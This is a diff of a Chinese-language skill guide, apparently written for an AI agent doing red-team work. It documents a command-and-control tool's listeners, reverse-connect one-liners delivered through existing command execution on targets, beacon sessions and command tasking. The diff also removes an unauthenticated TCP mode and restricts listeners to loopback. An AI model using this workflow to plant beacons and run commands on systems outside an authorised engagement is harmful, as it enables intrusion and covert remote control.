@@ -25,13 +25,13 @@ description: 当红队任务里拿到或需要复用稳定立足点时使用：W
 | 命令 | 作用 |
 |---|---|
 | `axiom c2 listeners` | 本任务监听器（id/name/kind/host:port/status） |
-| `axiom c2 listener-create --name N --port P [--kind http|tcp] [--host 0.0.0.0]` | 建监听器（不自动启动） |
+| `axiom c2 listener-create --name N --port P [--host 127.0.0.1]` | 建监听器（不自动启动）；只有 http 档，host 强制回环 |
 | `axiom c2 listener-start <cl_id>` / `listener-stop <cl_id>` | 启停 |
-| `axiom c2 oneliner <cl_id>` | 回连 one-liner（http 给 bash/python 轮询版，tcp 给 mkfifo+nc 版）；把回连地址换成目标可达的地址后，通过已有命令执行能力投递 |
+| `axiom c2 oneliner <cl_id>` | 回连 one-liner（bash/python 轮询版）；把回连地址换成 `https://<公网IP>:8888/c2` 后，通过已有命令执行能力投递 |
 | `axiom c2 sessions [--listener-id clX]` | 上线会话（id/remote/info/status/last_seen/sleep） |
 | `axiom c2 session-sleep <cs_id> --seconds N` | 调轮询间隔：交互需求高才调小，默认 5s 已够；长潜伏调大降低噪声 |
-| `axiom c2 session-kill <cs_id>` | 标记会话死亡（tcp 会发 exit） |
-| `axiom c2 exec <cs_id> '<命令>' [--wait 30]` | 下发任务：http 会话入队等 beacon 取走并回传；tcp 会话直读写至 1.5s 静默 |
+| `axiom c2 session-kill <cs_id>` | 标记会话死亡 |
+| `axiom c2 exec <cs_id> '<命令>' [--wait 30]` | 下发任务：http 会话入队等 beacon 取走并回传 |
 | `axiom c2 tasks [--session-id csX]` / `axiom c2 task <ct_id>` | 任务队列与结果（status: queued/sent/completed/failed） |
 
 http 监听协议：beacon `GET /index?sid=<自定id>` 取下一条命令（空=无任务），`POST /index?sid=<id>` 回传 base64 结果；新 sid 自动建会话。服务重启后监听器**不会**自动拉起，状态回落 stopped，需要重新 start。
@@ -44,8 +44,8 @@ axiom c2 listener-start clXXX
 axiom c2 oneliner clXXX        # 把其中的回连地址换成 https://<公网IP>:8888/c2
 ```
 
-- **不要**用 `--host 0.0.0.0`，**不要**占 443/8443 以外的低端口（443 需要 root，且会和 Caddy 抢）。
-- **不要**用 `--kind tcp`：裸 TCP 通道没有握手也没有鉴权，别人连上就能截走会话与命令；只有 http 档带 per-listener token。
+- `--host` 只接受回环地址，传 `0.0.0.0` 会被直接拒绝（422）。端口不要选 443 这类低端口：需要 root，且会和 Caddy 抢。
+- **没有 tcp 档**：裸 TCP 通道没有握手也没有鉴权，别人连上就能截走会话与命令，服务端已停用 `--kind tcp`。
 - one-liner 里的 `token=` 是监听器鉴权凭据，不要贴进 findings、Intent 描述或聊天。
 
 ## 3. 接力与收尾约定
